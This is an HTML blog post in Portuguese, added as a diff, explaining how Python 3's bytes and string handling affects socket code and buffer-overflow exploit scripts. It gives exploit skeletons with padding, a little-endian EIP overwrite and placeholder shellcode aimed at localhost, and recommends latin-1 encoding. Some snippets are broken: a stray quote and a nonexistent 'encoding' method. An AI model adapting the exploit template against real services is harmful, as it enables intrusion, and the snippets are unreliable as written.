@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <!-- iOS Safari -->
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <!-- Chrome, Firefox OS and Opera Status Bar Color -->
+  <meta name="theme-color" content="#FFFFFF">
+  <meta property="og:title" content="BoF + Sockets + Erros de Codificação com o Python3">
+    <meta name="description" content="Como o python3 mudou o seu entendimento sobre a codificação de strings e como isso afeta na escripta de exploits na hora de enviar payloads para exploração de Buffer Overflow">
+  <meta property="og:description" content="Como o python3 mudou o seu entendimento sobre a codificação de strings e como isso afeta na escripta de exploits na hora de enviar payloads para exploração de Buffer Overflow">
+    <meta property="og:type" content="blog">
+  <title>BoF + Sockets + Erros de Codificação com o Python3</title>
+  <link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.11.1/katex.min.css">
+  <link rel="stylesheet" type="text/css"
+    href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.19.0/themes/prism.min.css">
+  <link rel="stylesheet" type="text/css" href="css/SourceSansPro.css">
+  <link rel="stylesheet" type="text/css" href="css/notablog.css">
+  <link rel="stylesheet" type="text/css" href="css/theme.css">
+  <style>
+    :root {
+      font-size: 18px;
+    }
+
+    .DateTagBar {
+      margin-top: 1.0rem;
+    }
+  </style>
+</head>
+
+<body>
+  <nav class="Navbar">
+    <a href="index.html">
+      <div class="Navbar__Btn"><span>📖</span> <span>Home</span></div>
+    </a>
+                                                                                            <span class="Navbar__Delim">&centerdot;</span>
+    <a href="about.html">
+      <div class="Navbar__Btn"><span>⁉️</span> <span>About</span></div>
+    </a>
+                  </nav>
+  <header class="Header">
+          <div class="Header__Spacer Header__Spacer--NoCover">
+    </div>
+        <h1 class="Header__Title">BoF + Sockets + Erros de Codificação com o Python3</h1>
+            <div class="DateTagBar">
+                <span class="DateTagBar__Item DateTagBar__Date">Posted on Wed, Oct 28, 2020</span>
+                          <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--gray">
+            <a href="tag/bof.html">bof</a>
+          </span>
+                  </div>
+          </header>
+      <article id="https://www.notion.so/f5fa69fc96554ec3b56726571281d382" class="PageRoot"><div id="https://www.notion.so/8968fbb5f76b4e1f9572bd6e1c904c0b" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Com a vinda do Python 3 a forma com que as strings são &quot;tratadas&quot; mudou. O que antes, no Python 2 era um conjunto de caracteres ASCII , agora são Unicode. E o que isso muda para quem tá escrevendo exploits para explorar Buffer Overflow e até mesmo para quem deseja simplesmente enviar algo por um socket ? </span></span></p></div><div id="https://www.notion.so/a6fedaa0690040c7a974a50d7e7d1f6a" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Quando &quot;chamamos&quot; a função send() de um socket, esta espera como parâmetro Bytes. Se você tenta simplesmente enviar uma string como ocorria no Python2, um erro surge, informando: </span><span class="SemanticString"><em class="SemanticString__Fragment SemanticString__Fragment--Italic"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorRed">TypeError: a bytes-like object is required, not &#x27;str&#x27; with send function</mark></em></span></span></p></div><div id="https://www.notion.so/5515114e8aee4d438f84d65f13b6ff2f" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Para contornar, você precisará codificar a string que você quer enviar na codificação que deseja, ou simplesmente, informar que trata-se de uma sequência de bytes, colocando um b antes dela: </span></span></p></div><div id="https://www.notion.so/b52f78f0e95c43cb9c6fce3a0aba6983" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><pre id="https://www.notion.so/e6378cc967704a70a4fde5278c9be302" class="Code"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token keyword">import</span> sys<span class="token punctuation">,</span>socket
+
+host<span class="token operator">=</span><span class="token string">"127.0.0.1"</span>"
+port<span class="token operator">=</span><span class="token number">12345</span>
+
+<span class="token comment"># 1a forma - atenção para o b , antes das aspas.</span>
+<span class="token builtin">buffer</span><span class="token operator">=</span><span class="token string">b"alo mundo"</span>
+<span class="token comment"># 2a forma - informando que é uma sequencia de bytes utf-8</span>
+<span class="token builtin">buffer</span><span class="token operator">=</span><span class="token string">"alo_mundo"</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> 
+
+s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>
+s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span>port<span class="token punctuation">)</span><span class="token punctuation">)</span>
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedBg SemanticString__Fragment--BgOrange"><span>s<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token builtin">buffer</span><span class="token punctuation">)</span></span></mark></span><span class="SemanticString"><span>  <span class="token comment"># &lt;------------- Função afetada, em questão!</span>
+s<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></span></span></span></code></pre><div id="https://www.notion.so/466013ba73b445c2b4effb3c3e7b8833" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><blockquote id="https://www.notion.so/1eba8ecdf3af49b5bb41018932ea3d7f" class="ColorfulBlock ColorfulBlock--ColorDefault Quote"><span class="SemanticStringArray"><span class="SemanticString">Um pequeno parenteses no assunto, é que vi sugestões de se </span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedBg SemanticString__Fragment--BgYellow">usar a função sendall() ao invés de um simples send()</mark></span><span class="SemanticString"> , afim de garantir que todo o buffer seja enviado. </span></span></blockquote><div id="https://www.notion.so/5aa0eab96d7e4c328b9829205454bcda" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/95dc4de881e34c55a2e00607c724f16c" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">E para quem está escrevendo exploits ? Iremos notar que as o envio de UTF-8 não vai nos ajudar a encaixar o endereço certinho no EIP ou mesmo bagunçar o nosso Shell Code ? Porque ? Pois endereços , opcodes, etc., estão todos dentro do escopo apenas da antiga e atual tabela ASCII extendida, 0 - 255 bytes.</span></span></p></div><blockquote id="https://www.notion.so/34ae6271f72643b7b7e3e58c2fc27183" class="ColorfulBlock ColorfulBlock--ColorDefault Quote"><span class="SemanticStringArray"><span class="SemanticString">É necessário que o buffer a ser enviado seja em formato de bytes, dentro da tabela ASCII. </span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedBg SemanticString__Fragment--BgYellow">É necessário que seja codificado em latin-1</mark></span><span class="SemanticString">. </span></span></blockquote><div id="https://www.notion.so/079a3b05f4094bfab9f90a4e584f34f4" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/7d28255817944f4c8ed7f23dc35ceb3c" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Uma forma, usando apenas strings com código hexa diretamente inserido.  </span></span></p></div><pre id="https://www.notion.so/088487acec8e4df086c293db38cd1061" class="Code"><code><span class="SemanticStringArray"><span class="SemanticString"><span>
+<span class="token builtin">buffer</span><span class="token operator">=</span><span class="token string">"CMD "</span> <span class="token operator">+</span> <span class="token string">"A"</span> <span class="token operator">*</span> <span class="token number">143</span>
+EIP<span class="token operator">=</span><span class="token string">"\x6F\x14\x74\x72"</span> <span class="token comment">#&lt;-------- Endereço já em Little Endian</span>
+shellcode<span class="token operator">=</span><span class="token string">"C"</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">700</span><span class="token operator">-</span><span class="token builtin">len</span><span class="token punctuation">(</span><span class="token builtin">buffer</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token builtin">len</span><span class="token punctuation">(</span>EIP<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+<span class="token builtin">buffer</span><span class="token operator">=</span><span class="token builtin">buffer</span><span class="token operator">+</span>EIP<span class="token operator">+</span>shellcode
+
+s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span>socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>
+s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span>port<span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4096</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedBg SemanticString__Fragment--BgYellow"><span>s<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token builtin">buffer</span><span class="token punctuation">.</span>encoding<span class="token punctuation">(</span><span class="token string">'latin-1'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">#&lt;----- encoding in Latin-1</span></span></mark></span><span class="SemanticString"><span>
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] Sending Exploit %s"</span> <span class="token operator">%</span> <span class="token builtin">buffer</span> <span class="token punctuation">)</span>
+s<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></span></span></span></code></pre><div id="https://www.notion.so/74c33e73e73547e8abb035da38cfbeb7" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/1777caf302474575ab9f4fb3bd26b919" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Se usarmos a função pack() do módulo struct, que tem a função de convertes o endereço em Little Endian, é necesário que transformemos todas as strings em bytes, pois esta funçao retorna bytes.</span></span></p></div><div id="https://www.notion.so/2a7ec8072e9346b4bc1568db14045e51" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><pre id="https://www.notion.so/65fd8d159ae0498fb24ea35d278b79f0" class="Code"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedBg SemanticString__Fragment--BgYellow"><span><span class="token builtin">buffer</span><span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">"EXPLOIT1 "</span> <span class="token operator">+</span> <span class="token string">"A"</span> <span class="token operator">*</span> <span class="token number">143</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'latin-1'</span><span class="token punctuation">)</span> <span class="token comment">#&lt;--- encoding</span></span></mark></span><span class="SemanticString"><span>
+EIP<span class="token operator">=</span>pack<span class="token punctuation">(</span><span class="token string">"&lt;L"</span><span class="token punctuation">,</span><span class="token number">0x7274146F</span><span class="token punctuation">)</span>
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedBg SemanticString__Fragment--BgYellow"><span>shellcode<span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">"C"</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">700</span><span class="token operator">-</span><span class="token builtin">len</span><span class="token punctuation">(</span><span class="token builtin">buffer</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token builtin">len</span><span class="token punctuation">(</span>EIP<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'latin-1'</span><span class="token punctuation">)</span> <span class="token comment">#&lt;--- encoding</span>
+</span></mark></span><span class="SemanticString"><span>
+<span class="token builtin">buffer</span><span class="token operator">=</span><span class="token builtin">buffer</span> <span class="token operator">+</span> EIP <span class="token operator">+</span> shellcode
+
+s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span>socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>
+s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span>port<span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4096</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+s<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token builtin">buffer</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] Sending Exploit %s"</span> <span class="token operator">%</span> <span class="token builtin">buffer</span> <span class="token punctuation">)</span>
+s<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></span></span></span></code></pre><div id="https://www.notion.so/20265a07503e4a4d9261d8adc2b29a1c" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div></article>  <footer class="Footer">
+        <div>&copy; inDex 2019</div>
+        <div>&centerdot;</div>
+        <div>Powered by <a href="https://github.com/dragonman225/notablog" target="_blank"
+            rel="noopener noreferrer">Notablog</a>.
+        </div>
+    </footer>
+</body>
+
+</html>
